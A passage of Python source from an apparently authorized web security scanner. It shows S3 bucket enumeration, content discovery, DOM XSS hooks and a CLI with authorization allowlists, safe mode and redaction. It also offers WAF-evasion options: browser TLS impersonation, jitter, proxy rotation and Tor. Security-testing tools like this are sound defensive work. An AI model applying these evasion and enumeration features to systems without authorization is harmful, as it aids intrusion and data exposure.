            status = r.get('status', 0)
            if status in (200, 201, 204, 301, 302, 307, 401, 403):
                # Skip soft-404s (200 with the calibrated not-found body size).
                if soft404_size is not None and status == 200 and abs(r.get('size', 0) - soft404_size) <= 16:
                    continue
                sev = 'MEDIUM' if status in (200, 401, 403) else 'LOW'
                results.append({
                    'technique': f'Discovered: {r["path"]}', 'bypass': False,
                    'status': status, 'size': r.get('size', 0),
                    'reason': f'Resource candidate responded with HTTP {status}',
                    'severity': 'INFO', 'category': 'CONTENT_DISCOVERY',
                    'kind': 'observation', 'verification_status': 'informational',
                    'confidence': 'high', 'path': r['path'],
                })
        if results:
            print(f"  [+] Content discovery found {len(results)} resource(s)")
        return results

    def _test_s3_bucket_enum(self) -> List[Dict[str, Any]]:
        """Enumerate likely-public S3 buckets derived from the target name + wordlist."""
        results = []
        base = self.domain.split(':')[0]
        root = base.replace('www.', '').split('.')[0] if base else 'app'
        suffixes = _load_wordlist('s3_buckets.txt', fallback=[
            'backup', 'backups', 'assets', 'static', 'media', 'uploads', 'data',
            'dev', 'staging', 'prod', 'public', 'private', 'logs', 'images', 'files',
        ])
        suffixes = suffixes[:120]
        candidates = [root]
        for s in suffixes:
            candidates.append(f"{root}-{s}")
            candidates.append(f"{root}.{s}")
            candidates.append(f"{s}-{root}")
        candidates = list(dict.fromkeys(candidates))[:200]
        print(f"  [*] S3 bucket enumeration: {len(candidates)} candidates...")

        def _probe(bucket):
            url = f"https://{bucket}.s3.amazonaws.com/"
            try:
                resp = self._scoped_safe_request(url, timeout=self.timeout)
            except Exception:
                return None
            if resp is None:
                return None
            body = resp.text[:400]
            if resp.status_code == 200 and '<ListBucketResult' in body:
                return {'technique': f'Public S3 bucket: {bucket}', 'bypass': True,
                        'status': 200, 'reason': 'Bucket is publicly listable', 'severity': 'HIGH',
                        'category': 'CLOUD_S3', 'details': {'bucket': bucket, 'url': url}}
            if resp.status_code == 403 and ('AccessDenied' in body or 'Access Denied' in body):
                return {'technique': f'S3 bucket exists (private): {bucket}', 'bypass': False,
                        'status': 403, 'reason': 'Bucket exists but access is denied', 'severity': 'INFO',
                        'category': 'CLOUD_S3', 'details': {'bucket': bucket, 'url': url}}
            return None

        if self._executor is not None:
            futures = {self._executor.submit(_probe, b): b for b in candidates}
            for fut in as_completed(futures):
                try:
                    r = fut.result()
                    if r:
                        results.append(r)
                        if r['bypass']:
                            print(f"  [✓] HIGH: public S3 bucket {r['details']['bucket']}")
                except Exception:
                    pass
        return results

    def _test_websocket_fuzzing(self) -> List[Dict[str, Any]]:
        """Deep WebSocket testing (handshake, CSWSH origin, message fuzzing)."""
        try:
            from .websocket_tests import run_websocket_tests
        except Exception as e:
            logger.debug(f"websocket_tests unavailable: {e}")
            return []
        print("  [*] WebSocket deep fuzzing...")
        try:
            return run_websocket_tests(self.target, self.crawl_targets, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"WebSocket fuzzing error: {e}")
            return []

    def triage_with_ai(self, api_key: str = None, model: str = None,
                       provider: str = 'anthropic', base_url: str = None) -> Dict[str, Any]:
        """Run opt-in AI triage over current results (no-op without a key)."""
        try:
            from .ai_providers import triage_results
        except Exception as e:
            logger.debug(f"AI triage unavailable: {e}")
            return {}
        return triage_results(provider, self.target, self.results,
                              api_key=api_key, model=model, base_url=base_url)

    def _browser_session_context(self) -> Tuple[Dict[str, str], List[Dict[str, Any]]]:
        """Transfer the authenticated target session into an isolated browser context."""
        headers = {
            str(k): str(v) for k, v in self._session.headers.items()
            if str(k).lower() not in {'cookie', 'content-length', 'host'}
        }
        hostname = urlparse(self.target).hostname or self.domain
        cookies = []
        for cookie in self._session.cookies:
            item = {
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain or hostname,
                'path': cookie.path or '/',
                'secure': bool(cookie.secure),
            }
            cookies.append(item)
        return headers, cookies

    def _test_dom_xss(self) -> List[Dict[str, Any]]:
        """DOM-based XSS detection (optional, requires Playwright)."""
        try:
            from .browser_tests import run_dom_xss, PLAYWRIGHT_AVAILABLE
        except Exception:
            return []
        if not PLAYWRIGHT_AVAILABLE:
            logger.debug("Playwright not installed; skipping DOM XSS")
            return []
        print("  [*] Testing DOM XSS (headless browser)...")
        try:
            headers, cookies = self._browser_session_context()
            return run_dom_xss(
                self.target, self.crawl_targets, timeout=self.timeout,
                headers=headers, cookies=cookies,
            )
        except Exception as e:
            logger.debug(f"DOM XSS error: {e}")
            return []

    def _test_client_side_path_traversal(self) -> List[Dict[str, Any]]:
        """Client-Side Path Traversal detection (optional, requires Playwright)."""
        try:
            from .browser_tests import run_client_side_path_traversal, PLAYWRIGHT_AVAILABLE
        except Exception:
            return []
        if not PLAYWRIGHT_AVAILABLE:
            logger.debug("Playwright not installed; skipping CSPT")
            return []
        print("  [*] Testing Client-Side Path Traversal (headless browser)...")
        try:
            headers, cookies = self._browser_session_context()
            return run_client_side_path_traversal(
                self.target, self.crawl_targets, timeout=self.timeout,
                headers=headers, cookies=cookies,
            )
        except Exception as e:
            logger.debug(f"CSPT error: {e}")
            return []


# ============================================================================
# DB / plugin integration helpers — assemble a fully-wired scanner.
# ============================================================================

# Maps free-text DB payload categories to the keys the injection tests consume.
_PAYLOAD_CATEGORY_ALIASES = {
    'sql': 'sqli', 'sqli': 'sqli', 'sql injection': 'sqli',
    'xss': 'xss', 'cross-site scripting': 'xss',
    'cmd': 'command_injection', 'command': 'command_injection',
    'command injection': 'command_injection', 'rce': 'command_injection',
    'lfi': 'path_traversal', 'traversal': 'path_traversal',
    'path traversal': 'path_traversal', 'directory traversal': 'path_traversal',
    'ssrf': 'ssrf',
}


def load_custom_payloads(db=None) -> Dict[str, List[str]]:
    """Load enabled custom payloads from the DB, grouped by injection category."""
    out: Dict[str, List[str]] = {}
    try:
        if db is None:
            from .database import WAFPierceDB
            db = WAFPierceDB()
        rows = db.get_custom_payloads()
        for row in rows or []:
            cat = str(row.get('category', '')).strip().lower()
            key = _PAYLOAD_CATEGORY_ALIASES.get(cat, cat.replace(' ', '_'))
            payload = row.get('payload')
            if payload:
                out.setdefault(key, []).append(payload)
    except Exception as e:
        logger.debug(f"load_custom_payloads error: {e}")
    return out


def load_plugins() -> list:
    """Discover and return enabled user plugins (empty list on any failure).

    The PluginManager is wired to the shared on-disk DB so the scanner honors the
    enable/disable state set in the GUI plugin manager. Without the DB every
    discovered plugin would run regardless of being disabled.
    """
    try:
        from .plugins import PluginManager
        db = None
        try:
            from .database import WAFPierceDB
            db = WAFPierceDB()
        except Exception:
            db = None
        pm = PluginManager(db=db)
        pm.load_all_plugins()
        return pm.get_enabled_plugins()
    except Exception as e:
        logger.debug(f"load_plugins error: {e}")
        return []


def load_evasion_profile(db=None, waf_type: str = None) -> dict:
    """Load the best-matching evasion profile from the DB (empty dict if none)."""
    try:
        if db is None:
            from .database import WAFPierceDB
            db = WAFPierceDB()
        profiles = db.get_evasion_profiles(waf_type)
        return profiles[0] if profiles else {}
    except Exception as e:
        logger.debug(f"load_evasion_profile error: {e}")
        return {}


def create_scanner(target: str, db=None, use_db_extras: bool = True,
                   waf_type: str = None, **kwargs) -> 'CloudFrontBypasser':
    """Build a CloudFrontBypasser pre-wired with custom payloads, plugins, and an
    evasion profile loaded from the database / plugin manager.

    Any explicit kwargs (threads, delay, enable_crawl, ...) are passed through and
    take precedence over the DB-loaded extras.
    """
    feedback_db = None
    if use_db_extras:
        if db is None:
            try:
                from .database import WAFPierceDB
                db = WAFPierceDB()
            except Exception:
                db = None
        kwargs.setdefault('custom_payloads', load_custom_payloads(db))
        kwargs.setdefault('plugins', load_plugins())
        kwargs.setdefault('evasion_profile', load_evasion_profile(db, waf_type))
        feedback_db = db
    scanner = CloudFrontBypasser(target, **kwargs)
    scanner.feedback_db = feedback_db
    return scanner


def _pretty_technique(method_name: str) -> str:
    """Turn '_test_host_header_injection' into 'host header injection'."""
    name = method_name
    for prefix in ('_test_', '_'):
        if name.startswith(prefix):
            name = name[len(prefix):]
            break
    return name.replace('_', ' ')


def _resolve_categories(raw):
    """Validate a comma-separated category string against SCAN_CATEGORIES.

    Returns (selected_keys_or_None, invalid_list).
    """
    if not raw:
        return None, []
    requested = [c.strip() for c in raw.split(',') if c.strip()]
    valid = list(SCAN_CATEGORIES.keys())
    invalid = [c for c in requested if c not in valid]
    selected = [c for c in requested if c in valid]
    return (selected or None), invalid


def _print_category_list() -> None:
    print("Scan categories (use -c key1,key2 ...):\n")
    for key, cat in SCAN_CATEGORIES.items():
        n = len(cat.get('techniques', []))
        print(f"  {key:<22} {n:>3} techniques   {cat.get('name', '')}")
    print(f"\n  {len(SCAN_CATEGORIES)} categories total. "
          f"`blackthorn scan --list-techniques` for the full breakdown.")


def _print_technique_list() -> None:
    skip = getattr(CloudFrontBypasser, 'SAFE_MODE_SKIP', set())
    intrusive = getattr(CloudFrontBypasser, 'INTRUSIVE_WORKFLOW_SKIP', set())
    disabled = (
        getattr(CloudFrontBypasser, 'DISABLED_TRANSPORT_TECHNIQUES', set())
        | getattr(CloudFrontBypasser, 'DISABLED_ACCURACY_TECHNIQUES', set())
    )
    total = 0
    print("Techniques by category (* safe-mode skip, ! requires --intrusive, "
          "x disabled pending a proof-capable engine):\n")
    for key, cat in SCAN_CATEGORIES.items():
        techs = cat.get('techniques', [])
        total += len(techs)
        print(f"[{key}] {cat.get('name', '')}")
        for t in techs:
            marks = []
            if t in skip:
                marks.append('*')
            if t in intrusive:
                marks.append('!')
            if t in disabled:
                marks.append('x')
            mark = f" [{' '.join(marks)}]" if marks else ''
            print(f"    - {_pretty_technique(t)}{mark}")
        print()
    print(f"{total} techniques across {len(SCAN_CATEGORIES)} categories.")


# Per-profile presets. Each entry is applied only to args still at their CLI
# default, so anything the user passes explicitly always wins.
_PROFILE_PRESETS = {
    'stealth':    {'threads': 3,  'delay': 1.0, 'jitter': 1.5, 'safe_mode': True,
                   'impersonate': 'chrome'},
    'normal':     {'threads': 10, 'delay': 0.2, 'jitter': 0.0, 'safe_mode': False},
    'aggressive': {'threads': 30, 'delay': 0.0, 'jitter': 0.0, 'safe_mode': False},
}
# argparse defaults used to detect "user didn't set this".
_ARG_DEFAULTS = {'threads': 10, 'delay': 0.2, 'jitter': 0.0, 'safe_mode': False,
                 'impersonate': None}


def _apply_profile(args) -> None:
    """Fill in threads/delay/jitter/safe-mode/impersonate from --profile, but only
    where the user left the CLI default (explicit flags take precedence)."""
    preset = _PROFILE_PRESETS.get(getattr(args, 'profile', None) or '')
    if not preset:
        return
    for key, value in preset.items():
        if getattr(args, key, None) == _ARG_DEFAULTS.get(key):
            setattr(args, key, value)


def _is_actionable_result(result: Dict[str, Any]) -> bool:
    """Whether a result should count as a confirmed security finding/CI failure.

    Legacy results without the new state fields retain their previous behavior;
    explicit candidates and observations never fail a pipeline.
    """
    kind = str(result.get('kind') or '').lower()
    verification = str(result.get('verification_status') or '').lower()
    if not kind and str(result.get('category') or '').upper() in {
        'WAF_DETECTION', 'CDN_DETECTION', 'OS_DETECTION', 'API_DISCOVERY',
        'TECH_STACK', 'CT_LOGS', 'SUBDOMAIN_ENUM',
    }:
        return False
    if kind in ('observation', 'coverage', 'suspected'):
        return False
    if verification in (
        'candidate', 'not_detected', 'informational', 'unconfirmed', 'error'
    ):
        return False
    if kind == 'finding' or verification == 'confirmed':
        return bool(result.get('bypass', True))
    # Backwards compatibility for older/plugin findings without state metadata.
    return True


def _fail_on_exit(results, fail_on) -> 'Optional[int]':
    """CI gating: return exit code 10 if any finding is at or above ``fail_on``
    severity, else ``None`` (caller uses its normal exit code)."""
    if not fail_on:
        return None
    thr = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}.get(fail_on)
    if thr is None:
        return None
    rank = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
    if any(
        _is_actionable_result(r) and
        rank.get((r.get('severity') or 'INFO').upper(), 4) <= thr
        for r in results
    ):
        return 10
    return None


def _print_dry_run_plan(args, no_color: bool = False) -> None:
    """Show the technique plan + effective settings for the given flags, no I/O."""
    selected, invalid = _resolve_categories(getattr(args, 'categories', None))
    if invalid:
        print(f"[!] Unknown categories ignored: {', '.join(invalid)}")
    cats = selected or list(SCAN_CATEGORIES.keys())
    skip = set(getattr(CloudFrontBypasser, 'DISABLED_TRANSPORT_TECHNIQUES', set()))
    skip.update(getattr(CloudFrontBypasser, 'DISABLED_ACCURACY_TECHNIQUES', set()))
    if not getattr(args, 'intrusive', False):
        skip.update(getattr(CloudFrontBypasser, 'INTRUSIVE_WORKFLOW_SKIP', set()))
    if args.safe_mode:
        skip.update(getattr(CloudFrontBypasser, 'SAFE_MODE_SKIP', set()))

    proxies = []
    if getattr(args, 'proxy_pool', None):
        proxies = [p.strip() for p in args.proxy_pool.split(',') if p.strip()]
    if getattr(args, 'tor', False):
        proxies.append('socks5h://127.0.0.1:9050')
    has_auth = any(getattr(args, k, None) for k in
                   ('cookie', 'header', 'bearer', 'basic_auth', 'login_url'))
    imports = [s for s in (getattr(args, 'import_har', None),
                           getattr(args, 'import_postman', None),
                           getattr(args, 'import_burp', None)) if s]

    print(f"DRY RUN - plan for {args.target}\n")
    print("Settings:")
    print(f"  threads={args.threads}  delay={args.delay}s  timeout={args.timeout}s"
          f"  jitter={args.jitter}s")
    print(f"  impersonate={args.impersonate or 'off'}  oob={args.oob}"
          f"  safe_mode={'on' if args.safe_mode else 'off'}"
          f"  intrusive={'on' if getattr(args, 'intrusive', False) else 'off'}"
          f"  resume={'on' if args.resume else 'off'}")
    print(f"  crawl={'off' if args.no_crawl else 'on'}  schema={'off' if args.no_schema else 'on'}"
          f"  reconfirm={'off' if args.no_reconfirm else f'on(x{args.reconfirm_samples})'}"
          f"  db_extras={'off' if args.no_db_extras else 'on'}")
    print(f"  proxies={len(proxies)}  auth={'yes' if has_auth else 'no'}"
          f"  imports={len(imports)}")
    if args.scope_include:
        print(f"  scope-include: {', '.join(args.scope_include)}")
    if args.scope_exclude:
        print(f"  scope-exclude: {', '.join(args.scope_exclude)}")

    print("\nCategories & techniques that would run:")
    total = 0
    skipped = 0
    for key in cats:
        cat = SCAN_CATEGORIES.get(key)
        if not cat:
            continue
        techs = cat.get('techniques', [])
        running = [t for t in techs if t not in skip]
        skipped += len(techs) - len(running)
        total += len(running)
        print(f"  [{key}] {cat.get('name', '')} - {len(running)} run"
              + (f", {len(techs) - len(running)} skipped(guards)"
                 if (len(techs) - len(running)) else ""))
        for t in running:
            print(f"      - {_pretty_technique(t)}")

    print(f"\nTotal: {total} techniques would run"
          + (f" ({skipped} skipped by safety/accuracy guards)" if skipped else "")
          + f" across {len([k for k in cats if k in SCAN_CATEGORIES])} categories.")
    print("(dry run - no requests were sent)")


def main(argv=None):
    """Standalone scanner with comprehensive error handling.

    Accepts an explicit ``argv`` (list of args *after* the subcommand) so the
    unified :mod:`wafpierce.cli` dispatcher can route ``blackthorn scan ...`` here;
    falls back to ``sys.argv[1:]`` when run directly.
    """
    from argparse import ArgumentParser
    import json
    import os
    import sys
    from .error_handler import setup_logging

    if argv is None:
        argv = sys.argv[1:]

    no_color_env = bool(os.environ.get('NO_COLOR'))

    # Pre-parse the informational flags that must work without a target.
    if '-V' in argv or '--version' in argv:
        from .diagnostics import print_version
        print_version(no_color=('--no-color' in argv) or no_color_env)
        return 0
    if '--list-categories' in argv:
        _print_category_list()
        return 0
    if '--list-techniques' in argv:
        _print_technique_list()
        return 0

    parser = ArgumentParser(
        prog='blackthorn scan',
        description='Blackthorn authorized web security investigation scanner',
    )
    parser.add_argument('target', nargs='?', help='Target URL (or set it in --config)')
    parser.add_argument('-V', '--version', action='store_true',
                       help='Show version + installed optional components, then exit')
    parser.add_argument('--config', metavar='FILE',
                       help='Load scanner defaults from a JSON/TOML config file '
                            '(explicit flags still win)')
    parser.add_argument('--config-profile', metavar='NAME',
                       help='Use a named [profiles.NAME] section from --config')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--log-file', help='Log file path')
    parser.add_argument('--log-level', default='INFO',
                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
                       help='Logging level')
    parser.add_argument('-c', '--categories', help='Comma-separated list of scan categories to run (default: all)')
    # Discovery
    parser.add_argument('--no-crawl', action='store_true', help='Disable endpoint/parameter crawling')
    parser.add_argument('--no-schema', action='store_true', help='Disable OpenAPI/GraphQL schema ingestion')
    # Extensibility
    parser.add_argument('--no-db-extras', action='store_true',
                       help='Do not load custom payloads / plugins / evasion profile from the DB')
    # Accuracy
    parser.add_argument('--no-reconfirm', action='store_true',
                       help='Skip the bypass re-confirmation pass (faster, more false positives)')
    parser.add_argument('--reconfirm-samples', type=int, default=2,
                       help='Replays per candidate bypass during re-confirmation (default: 2)')
    parser.add_argument('--max-time', type=int, default=0, metavar='SECONDS',
                       help='Overall scan budget: stop launching new techniques after N seconds '
                            '(0 = no limit). Findings so far are still reported.')
    # Evasion: TLS/HTTP2 fingerprint impersonation (needs curl_cffi)
    parser.add_argument('--impersonate', nargs='?', const='chrome', default=None,
                       metavar='BROWSER',
                       help='Mimic a real browser TLS (JA3/JA4) + HTTP/2 fingerprint via '
                            'curl_cffi to evade bot/JS WAFs. Bare flag = chrome; or pass a '
                            'target like chrome124 / safari17_0')
    parser.add_argument('--jitter', type=float, default=0.0, metavar='SECONDS',
                       help='Add up to N random seconds per request (rate-WAF evasion)')
    parser.add_argument('--profile', choices=['stealth', 'normal', 'aggressive'],
                       help='Bundle threads/delay/jitter/safe-mode (and impersonate for stealth) '
                            'into one knob. Explicit flags you pass still win.')
    parser.add_argument('--seed', type=int, metavar='N',
                       help='Seed the RNG (jitter, UA/proxy rotation, mutations) for reproducible scans')
    parser.add_argument('--proxy-pool', help='Comma-separated proxy URLs to rotate per request '
                                             '(e.g. "http://a:8080,socks5h://b:1080")')
    parser.add_argument('--tor', action='store_true',
                       help='Route through Tor (adds socks5h://127.0.0.1:9050 to the proxy pool)')
    # Scope & safety
    parser.add_argument('--scope-include', action='append', default=[], metavar='REGEX',
                       help='Only test discovered URLs matching this regex (repeatable)')
    parser.add_argument('--scope-exclude', action='append', default=[], metavar='REGEX',
                       help='Never test discovered URLs matching this regex (repeatable)')
    parser.add_argument('--safe-mode', action='store_true',
                       help='Skip noisy/DoS-flavored and state-changing techniques')
    parser.add_argument('--intrusive', action='store_true',
                       help='Explicitly enable guessed state-changing workflows (uploads, '
                            'emails, race/cache tests). Requires separate impact authorization.')
    parser.add_argument('--authorize', metavar='FILE',
                       help='Path to an allowlist of authorized hosts/URL patterns (one per '
                            'line, globs ok). The target must match before any test runs.')
    parser.add_argument('--no-redact', action='store_true',
                       help='Do NOT redact secrets (cookies/tokens/auth) from saved reports '
                            '(redaction is on by default)')
    parser.add_argument('--resume', action='store_true',
                       help='Resume an interrupted scan of this target from its checkpoint')
    # Exports
    parser.add_argument('--export', help='Write an extra export to this path (format from --export-format)')
    parser.add_argument('--export-format', default='html',
                       choices=['sarif', 'nuclei', 'html', 'json', 'pdf', 'junit', 'csv',
                                'prometheus', 'har'],
                       help='Format for --export (default: html)')
    parser.add_argument('--json', action='store_true', help='Print results as JSON to stdout (pipeline mode)')
    parser.add_argument('--fail-on', choices=['critical', 'high', 'medium', 'low', 'info'],
                       metavar='SEVERITY',
                       help='Exit non-zero (code 10) if any finding at or above this severity is '
                            'present (CI gating). Independent of the default 0/1 exit code.')
    # Import recorded traffic to fuzz real (often authenticated) requests
    parser.add_argument('--import-har', help='Seed the scan from a HAR capture')
    parser.add_argument('--import-postman', help='Seed the scan from a Postman v2 collection')
    parser.add_argument('--import-burp', help='Seed the scan from a Burp items XML export')
    # Integrations
    parser.add_argument('--slack-webhook', help='Post a findings summary to a Slack incoming webhook')
    parser.add_argument('--discord-webhook', help='Post a findings summary to a Discord webhook')
    parser.add_argument('--teams-webhook', help='Post a findings summary to a Microsoft Teams incoming webhook')
    # AI (opt-in)
    parser.add_argument('--ai-triage', action='store_true', help='Run AI false-positive triage (opt-in; provider configured separately)')
    parser.add_argument('--ai-report', help='Write an AI-generated markdown report to this path')
    parser.add_argument('--ai-key', help='AI API key (overrides provider env; avoid passing from GUI)')
    parser.add_argument('--ai-model', help='AI model id (default: per-provider)')
    parser.add_argument('--ai-provider', default='anthropic',
                       choices=['anthropic', 'ollama', 'openai-compatible'],
                       help='AI provider for --ai-triage/--ai-report')
    parser.add_argument('--ai-base-url', help='AI provider base URL (Ollama or OpenAI-compatible)')
    # Out-of-band (OOB) blind-vuln confirmation (opt-in)
    parser.add_argument('--oob', choices=['off', 'interactsh', 'selfhosted'], default='off',
                       help='Enable out-of-band confirmation of blind vulns (default: off)')
    parser.add_argument('--oob-server', help='Interactsh server (default: public oast.* rotation)')
    parser.add_argument('--oob-token', help='Interactsh auth token (for a self-hosted Interactsh)')
    parser.add_argument('--oob-domain', help='Self-hosted listener public domain (NS-delegated to you)')
    parser.add_argument('--oob-public-host', help='Self-hosted listener public host[:port] for HTTP-only mode')
    parser.add_argument('--oob-http-port', type=int, default=0, help='Self-hosted listener HTTP bind port (0=ephemeral)')
    parser.add_argument('--oob-dns-port', type=int, help='Self-hosted listener DNS bind port (e.g. 53; needs privilege)')
    parser.add_argument('--oob-wait', type=int, default=8, help='Min seconds to wait for OOB callbacks (default: 8)')
    # Monitoring
    parser.add_argument('--monitor', action='store_true', help='After scanning, diff against the previous scan of this target')
    parser.add_argument('--webhook', help='Webhook URL for monitoring alerts')
    parser.add_argument('--diff-against', metavar='PREV.json',
                       help='Compare this scan against a previous results JSON and write an HTML diff')
    parser.add_argument('--diff-out', metavar='OUT.html', default='wafpierce-diff.html',
                       help='Output path for the --diff-against HTML diff (default: wafpierce-diff.html)')
    # Authenticated scanning
    parser.add_argument('--cookie', help='Cookie string to send on every request (e.g. "session=abc; csrf=xyz")')
    parser.add_argument('--header', action='append', default=[], help='Extra header "Name: value" (repeatable)')
    parser.add_argument('--bearer', help='Bearer token -> Authorization: Bearer <token>')
    parser.add_argument('--basic-auth', help='HTTP Basic auth as user:pass')
    parser.add_argument('--login-url', help='Login URL to authenticate before scanning')
    parser.add_argument('--login-data', help='Login form data as urlencoded string (e.g. "user=a&pass=b")')
    parser.add_argument('--login-success', help='Substring expected in a successful login response')
    # Usability / output
    parser.add_argument('--dry-run', action='store_true',
                       help='Print the technique plan for the given flags/scope/safe-mode and exit '
                            '(no requests sent)')
    parser.add_argument('-q', '--quiet', action='store_true',
                       help='Suppress per-finding output; print only a one-line summary')
    parser.add_argument('--no-color', action='store_true',
                       help='Disable emoji/colored decoration (also honors the NO_COLOR env var)')
    parser.add_argument('--list-categories', action='store_true',
                       help='List available scan categories and exit')
    parser.add_argument('--list-techniques', action='store_true',
                       help='List every technique grouped by category and exit')
    args = parser.parse_args(argv)

    # Late catch for informational flags (also handled pre-parse for no-target use).
    if getattr(args, 'version', False):
        from .diagnostics import print_version
        print_version(no_color=args.no_color or no_color_env)
        return 0

    no_color = args.no_color or no_color_env
    quiet = args.quiet

    # Load config-file defaults (explicit CLI flags already on `args` win).
    if args.config:
        try:
            from .configfile import load_config, apply_config
            apply_config(args, parser, load_config(args.config, profile=args.config_profile))
        except Exception as e:
            print(f"[!] Config load failed: {e}")
            return 2

    # Resolve --profile presets (explicit flags win) before anything reads them.
    _apply_profile(args)

    # A target is required (from the positional arg or the config file).
    if not args.target:
        parser.error("a target URL is required (pass it as an argument or set it in --config)")

    # Deterministic RNG for reproducible scans (jitter/UA/proxy/mutation choices).
    if args.seed is not None:
        import random
        random.seed(args.seed)

    # Dry run: show exactly what would execute, then stop before any network I/O.
    if args.dry_run:
        _print_dry_run_plan(args, no_color=no_color)
        return 0

    # Authorization gate: when an allowlist is supplied, the target's host must
    # match before any active test runs (fail-closed on empty/unreadable list).
    authorization_patterns = []
    if args.authorize:
        from .authorization import load_allowlist, is_authorized
        authorization_patterns = load_allowlist(args.authorize)
        if not is_authorized(args.target, authorization_patterns):
            print(f"[!] '{args.target}' is not in the authorization allowlist "
                  f"({args.authorize}); refusing to scan.")
            return 5

    # In --json/pipeline mode, keep stdout clean for machine consumption.
    if args.json:
        _quiet_stdout()
    
    # Parse categories if provided
    selected_categories = None
    if args.categories:
        selected_categories = [c.strip() for c in args.categories.split(',') if c.strip()]
        # Validate categories
        valid_categories = list(SCAN_CATEGORIES.keys())
        invalid = [c for c in selected_categories if c not in valid_categories]
        if invalid:
            print(f"[!] Warning: Unknown categories ignored: {', '.join(invalid)}")
            selected_categories = [c for c in selected_categories if c in valid_categories]
        if not selected_categories:
            print("[!] No valid categories specified, running all scans")
            selected_categories = None
    
    # Setup logging
    setup_logging(args.log_file, args.log_level)
    
    # Assemble authenticated-scanning config from CLI flags.
    auth = {}
    if args.cookie:
        auth['cookies'] = args.cookie
    if args.header:
        hdrs = {}
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                hdrs[k.strip()] = v.strip()
        if hdrs:
            auth['headers'] = hdrs
    if args.bearer:
        auth['bearer'] = args.bearer
    if args.basic_auth and ':' in args.basic_auth:
        u, p = args.basic_auth.split(':', 1)
        auth['basic'] = (u, p)
    if args.login_url:
        login = {'url': args.login_url, 'method': 'POST'}
        if args.login_data:
            from urllib.parse import parse_qs as _pqs
            login['data'] = {k: v[0] for k, v in _pqs(args.login_data).items()}
        if args.login_success:
            login['success'] = args.login_success
        auth['login'] = login

    # Build the OOB provider if requested (opt-in; callbacks may use third-party
    # infrastructure when using public Interactsh servers).
    oob_provider = None
    if args.oob and args.oob != 'off':
        try:
            from .oob import build_oob
            oob_provider = build_oob(
                args.oob,
                server=args.oob_server, token=args.oob_token,
                public_domain=args.oob_domain, public_host=args.oob_public_host,
                http_port=args.oob_http_port, dns_port=args.oob_dns_port,
            )
            if oob_provider:
                print(f"[*] OOB confirmation enabled ({oob_provider.name})")
            else:
                print("[!] OOB provider could not start; continuing without it")
        except Exception as e:
            print(f"[!] OOB init failed: {e}")

    # Assemble proxy pool (+ Tor) and scope rules.
    proxy_pool = []
    if args.proxy_pool:
        proxy_pool = [p.strip() for p in args.proxy_pool.split(',') if p.strip()]
    if args.tor:
        proxy_pool.append('socks5h://127.0.0.1:9050')
    scope = {}
    if args.scope_include:
        scope['include'] = args.scope_include
    if args.scope_exclude:
        scope['exclude'] = args.scope_exclude

    # Import recorded traffic (HAR / Postman / Burp) to seed the scan.
    seed_targets = []
    try:
        from .importers import load_requests
        for src, fmt in ((args.import_har, 'har'), (args.import_postman, 'postman'),
                         (args.import_burp, 'burp')):
            if src:
                imported = load_requests(src, fmt)
                seed_targets.extend(imported)
                print(f"[*] Imported {len(imported)} request(s) from {src}")
    except Exception as e:
        print(f"[!] Import failed: {e}")

    try:
        # Initialize scanner (pre-wired with DB custom payloads / plugins / evasion
        # profile unless explicitly disabled).
        scanner = create_scanner(
            args.target,
            use_db_extras=not args.no_db_extras,
            threads=args.threads, delay=args.delay, timeout=args.timeout,
            enable_crawl=not args.no_crawl, enable_schema=not args.no_schema,
            auth=auth or None, oob=oob_provider, impersonate=args.impersonate,
            scope=scope or None, safe_mode=args.safe_mode, jitter=args.jitter,
            proxy_pool=proxy_pool or None, seed_targets=seed_targets or None,
            intrusive=args.intrusive,
            authorization_patterns=authorization_patterns,
        )
        scanner.reconfirm = not args.no_reconfirm
        scanner.reconfirm_samples = max(1, args.reconfirm_samples)
        scanner.oob_wait = max(0, args.oob_wait)
        scanner.resume = args.resume
        scanner.max_time = max(0, args.max_time)

        # Audit record: a scan against this target is starting.
        try:
            from .authorization import audit_log
            audit_log('scan_start', target=args.target, categories=selected_categories,
                      safe_mode=args.safe_mode, intrusive=args.intrusive,
                      authorized=bool(args.authorize))
        except Exception:
            pass

        # Run scan with selected categories
        results = scanner.scan(selected_categories)

        # CI gating: optionally exit non-zero (10) when findings reach a severity.
        fail_exit = _fail_on_exit(results, args.fail_on)

        try:
            from .authorization import audit_log
            audit_log('scan_end', target=args.target, findings=len(results),
                      bypasses=sum(1 for r in results if r.get('bypass')))
        except Exception:
            pass

        # Opt-in AI triage (annotates results with false-positive likelihood).
        if args.ai_triage:
            try:
                summary = scanner.triage_with_ai(
                    api_key=args.ai_key, model=args.ai_model,
                    provider=args.ai_provider, base_url=args.ai_base_url)
                if summary:
                    print(f"[+] AI triage: {summary.get('likely_false_positives', 0)}/"
                          f"{summary.get('triaged', 0)} flagged as likely false positives")
                else:
                    print(f"[!] AI triage skipped ({args.ai_provider} unavailable or returned no triage)")
            except Exception as e:
                logger.debug(f"AI triage error: {e}")

        # Redact only after all annotations are attached so saved/exported
        # artifacts include AI triage metadata. If redaction ever fails, emit a
        # deliberately small safe record instead of falling back to raw secrets.
        if args.no_redact:
            out_results = results
        else:
            try:
                from .redaction import redact_findings
                out_results = redact_findings(results)
            except Exception as exc:
                logger.error(f"Result redaction failed closed: {exc}")
                print("[!] Result redaction failed; sensitive request evidence was omitted")
                safe_keys = {
                    'finding_id', 'fingerprint', 'title', 'technique', 'category',
                    'severity', 'kind', 'verification_status', 'confidence',
                    'reason', 'remediation', 'status', 'method', 'path',
                    'observed_at',
                }
                out_results = [
                    {key: value for key, value in result.items() if key in safe_keys}
                    if isinstance(result, dict) else {'title': 'Redacted result'}
                    for result in results
                ]

        # Extra export artifact (SARIF / Nuclei / HTML / JSON).
        if args.export:
            try:
                from .exporters import export as _export
                _export(
                    out_results, args.target, args.export_format, args.export,
                    redact=not args.no_redact,
                )
                print(f"[+] Exported {args.export_format.upper()} to {args.export}")
            except Exception as e:
